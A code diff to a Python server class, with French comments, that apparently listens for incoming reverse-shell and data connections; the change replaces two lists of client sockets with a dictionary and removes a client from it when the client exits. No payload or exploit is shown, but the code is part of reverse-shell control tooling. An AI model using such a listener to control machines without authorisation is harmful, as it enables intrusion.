@@ -11,8 +11,7 @@ import json
 class Server():
     def __init__(self):
         self._host = "0.0.0.0"
-        self.cSocketList = []
-        self.cAddrList = []
+        self.connectedServers = dict()
         self._serverThreadList = [self._serverData, self._serverReverseShell]
 
 
@@ -73,6 +72,7 @@ class Server():
                 data = self._receiving(c)
             
             if data["command"].lower() == "exit":
+                self.connectedServers.pop(c)
                 quitting = True
                 c.close()
                 continue
@@ -95,8 +95,8 @@ class Server():
         while True:
             try:
                 c, addr = s.accept()
-                self.cSocketList.append(c)
-                self.cAddrList.append(addr)
+                self.connectedServers[c] = addr
+                
                 print('Got connection from', addr)
 
                 # On crée un thread receiving data
@@ -133,16 +133,15 @@ class Server():
                 args=(c,)
             )
             connection_handler.start()
-            print("\n Nombre de Thread", threading.active_count())
+            print(self.connectedServers)
+        
 
     def main(self):
-        # Démarre deux threads pour recevoir les connexions ReverseShell et d'envoi de données
+        # Démarre deux threads pour recevoir les connexions: 1- ReverseShell 2- d'envoi de données
         for server in self._serverThreadList:
             s = socket.socket()
             threading.Thread(target=server, args=(s,)).start()
             
-
-    
 
 
 if __name__ == "__main__":
